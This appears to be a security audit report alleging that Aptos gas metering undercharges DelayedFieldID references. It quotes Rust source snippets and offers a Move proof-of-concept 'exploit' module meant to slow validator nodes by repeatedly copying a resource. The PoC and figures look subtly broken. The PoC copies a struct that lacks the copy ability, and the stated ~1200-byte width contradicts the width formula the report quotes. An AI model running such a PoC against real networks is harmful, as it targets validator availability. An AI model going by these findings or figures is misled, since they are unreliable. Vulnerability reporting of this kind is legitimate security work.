# Audit Report

## Title
Gas Undercharging for DelayedFieldID References Enables Validator Node Slowdowns

## Summary
The `visit_delayed` function in the gas schedule charges only 40 gas units per DelayedFieldID reference, regardless of the actual data size (width) represented by the delayed field. This enables attackers to create transactions that manipulate large delayed field structures while paying minimal gas, causing validator node slowdowns.

## Finding Description

The `visit_delayed` function treats all DelayedFieldID references as if they were simple u64 values, charging a fixed 40 gas units per reference: [1](#0-0) 

The function ignores the `_id` parameter, which contains a `width` field representing the exact serialized byte size of the delayed field: [2](#0-1) 

During transaction execution, when values containing DelayedFieldIDs are copied, moved, passed as function arguments, or used in comparisons, the gas meter uses `abstract_value_size()` which calls `visit_delayed`: [3](#0-2) 

**Attack Path:**
1. Attacker creates 10 DerivedStringSnapshot fields (maximum per resource limit) with 1024-byte inputs each via `native_create_derived_string`: [4](#0-3) 

2. Width calculation for a 1024-byte input produces ~1200+ bytes due to encoding overhead: [5](#0-4) 

3. The attacker stores these 10 DelayedFieldIDs in a resource (total ~12,000 bytes of actual data)
4. The transaction copies this resource 100 times via `copy_loc` or function calls
5. Gas charged: 100 copies × 10 fields × 40 gas = 40,000 gas units
6. Actual computational cost: proportional to 100 × 12,000 = 1,200,000 bytes

The system acknowledges this issue with a TODO comment indicating proper charges are not yet implemented: [6](#0-5) 

This breaks the **Move VM Safety** invariant: "Bytecode execution must respect gas limits and memory constraints."

## Impact Explanation

This qualifies as **High Severity** per Aptos bug bounty criteria: "Validator node slowdowns"

An attacker can craft transactions that:
- Manipulate large data structures (12KB per resource with 10 delayed fields)
- Perform repeated copy operations paying only for u64-sized references
- Consume validator CPU and memory proportional to actual data size (~30x undercharge)
- Execute within gas limits while causing disproportionate computational load

Multiple such transactions could degrade validator performance, increasing block production time and reducing network throughput.

## Likelihood Explanation

**High Likelihood:**
- Attack requires only basic Move programming knowledge
- No special privileges needed (any transaction sender)
- Native functions for creating delayed fields are publicly accessible
- Maximum of 10 delayed fields per resource, but attacker can create multiple resources
- Copying operations are common in Move programs
- Confirmed by TODO comment indicating issue is known but unresolved

## Recommendation

Modify `visit_delayed` to account for the `width` field when charging gas:

```rust
fn visit_delayed(&mut self, depth: u64, id: DelayedFieldID) -> PartialVMResult<()> {
    self.check_depth(depth)?;
    // Charge based on actual width, not just u64 size
    let width_bytes = id.extract_width() as u64;
    self.size += self.params.per_u8_packed * NumArgs::new(width_bytes);
    Ok(())
}
```

Apply similar fixes to `abstract_stack_size` and `abstract_packed_size` visitors. Ensure width-based charging is applied consistently across all value size calculations used for gas metering.

## Proof of Concept

```move
module attacker::gas_bypass {
    use aptos_framework::aggregator_v2;
    use std::string;
    use std::vector;

    // Create a resource with 10 large delayed fields
    struct LargeDelayedResource has key {
        field1: aggregator_v2::DerivedStringSnapshot,
        field2: aggregator_v2::DerivedStringSnapshot,
        field3: aggregator_v2::DerivedStringSnapshot,
        field4: aggregator_v2::DerivedStringSnapshot,
        field5: aggregator_v2::DerivedStringSnapshot,
        field6: aggregator_v2::DerivedStringSnapshot,
        field7: aggregator_v2::DerivedStringSnapshot,
        field8: aggregator_v2::DerivedStringSnapshot,
        field9: aggregator_v2::DerivedStringSnapshot,
        field10: aggregator_v2::DerivedStringSnapshot,
    }

    // Create large delayed field (1024 bytes = max allowed)
    fun create_large_string(): vector<u8> {
        let data = vector::empty<u8>();
        let i = 0;
        while (i < 1024) {
            vector::push_back(&mut data, 65); // 'A'
            i = i + 1;
        };
        data
    }

    public entry fun exploit(account: &signer) {
        // Create 10 large delayed fields
        let s = create_large_string();
        let f1 = aggregator_v2::create_derived_string(string::utf8(s));
        let f2 = aggregator_v2::create_derived_string(string::utf8(s));
        let f3 = aggregator_v2::create_derived_string(string::utf8(s));
        let f4 = aggregator_v2::create_derived_string(string::utf8(s));
        let f5 = aggregator_v2::create_derived_string(string::utf8(s));
        let f6 = aggregator_v2::create_derived_string(string::utf8(s));
        let f7 = aggregator_v2::create_derived_string(string::utf8(s));
        let f8 = aggregator_v2::create_derived_string(string::utf8(s));
        let f9 = aggregator_v2::create_derived_string(string::utf8(s));
        let f10 = aggregator_v2::create_derived_string(string::utf8(s));

        let resource = LargeDelayedResource {
            field1: f1, field2: f2, field3: f3, field4: f4, field5: f5,
            field6: f6, field7: f7, field8: f8, field9: f9, field10: f10,
        };

        // Copy the resource many times to exploit undercharge
        let i = 0;
        while (i < 100) {
            let _copy = copy resource; // Only charges 400 gas but represents 12KB
            i = i + 1;
        };

        move_to(account, resource);
    }
}
```

This PoC demonstrates creating a resource with 10 maximum-sized delayed fields (12KB total) and copying it 100 times, paying only ~40,000 gas while performing operations on ~1.2MB of data.

### Citations

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/misc.rs (L209-213)
```rust
    fn visit_delayed(&mut self, depth: u64, _id: DelayedFieldID) -> PartialVMResult<()> {
        self.check_depth(depth)?;
        self.size += self.params.u64;
        Ok(())
    }
```

**File:** third_party/move/move-vm/types/src/delayed_values/delayed_field_id.rs (L26-30)
```rust
pub struct DelayedFieldID {
    unique_index: u32,
    // Exact number of bytes serialized delayed field will take.
    width: u32,
}
```

**File:** aptos-move/aptos-memory-usage-tracker/src/lib.rs (L364-371)
```rust
            self.use_heap_memory(ret_vals.try_fold(AbstractValueSize::zero(), |acc, val| {
                let heap_size = self
                    .vm_gas_params()
                    .misc
                    .abs_val
                    .abstract_heap_size(val, self.feature_version())?;
                Ok::<_, PartialVMError>(acc + heap_size)
            })?)?;
```

**File:** aptos-move/framework/src/natives/aggregator_natives/aggregator_v2.rs (L490-521)
```rust
fn native_create_derived_string(
    context: &mut SafeNativeContext,
    ty_args: &[Type],
    mut args: VecDeque<Value>,
) -> SafeNativeResult<SmallVec<[Value; 1]>> {
    debug_assert_eq!(ty_args.len(), 0);
    debug_assert_eq!(args.len(), 1);
    context.charge(AGGREGATOR_V2_CREATE_SNAPSHOT_BASE)?;

    let value_bytes = string_to_bytes(safely_pop_arg!(args, Struct))
        .map_err(SafeNativeError::InvariantViolation)?;
    context
        .charge(AGGREGATOR_V2_CREATE_SNAPSHOT_PER_BYTE * NumBytes::new(value_bytes.len() as u64))?;

    if value_bytes.len() > DERIVED_STRING_INPUT_MAX_LENGTH {
        return Err(SafeNativeError::Abort {
            abort_code: EINPUT_STRING_LENGTH_TOO_LARGE,
        });
    }

    let derived_string_snapshot =
        if let Some((resolver, mut delayed_field_data)) = get_context_data(context) {
            let id = delayed_field_data.create_new_derived(value_bytes, resolver)?;
            Value::delayed_value(id)
        } else {
            let width = calculate_width_for_constant_string(value_bytes.len());
            bytes_and_width_to_derived_string_struct(value_bytes, width)
                .map_err(SafeNativeError::InvariantViolation)?
        };

    Ok(smallvec![derived_string_snapshot])
}
```

**File:** types/src/delayed_fields.rs (L15-20)
```rust
pub fn calculate_width_for_constant_string(byte_len: usize) -> usize {
    // we need to be able to store it both raw, as well as when it is exchanged with u64 DelayedFieldID.
    // so the width needs to be larger of the two options
    (bcs_size_of_byte_array(byte_len) + 1) // 1 is for empty padding serialized length
        .max(*U64_MAX_DIGITS + 2) // largest exchanged u64 DelayedFieldID is u64 max digits, plus 1 for each of the value and padding serialized length
}
```

**File:** third_party/move/move-vm/types/src/value_serde.rs (L50-54)
```rust
    // Temporarily limit the number of delayed fields per resource, until proper charges are
    // implemented.
    // TODO[agg_v2](clean):
    //   Propagate up, so this value is controlled by the gas schedule version.
    const MAX_DELAYED_FIELDS_PER_RESOURCE: usize = 10;
```
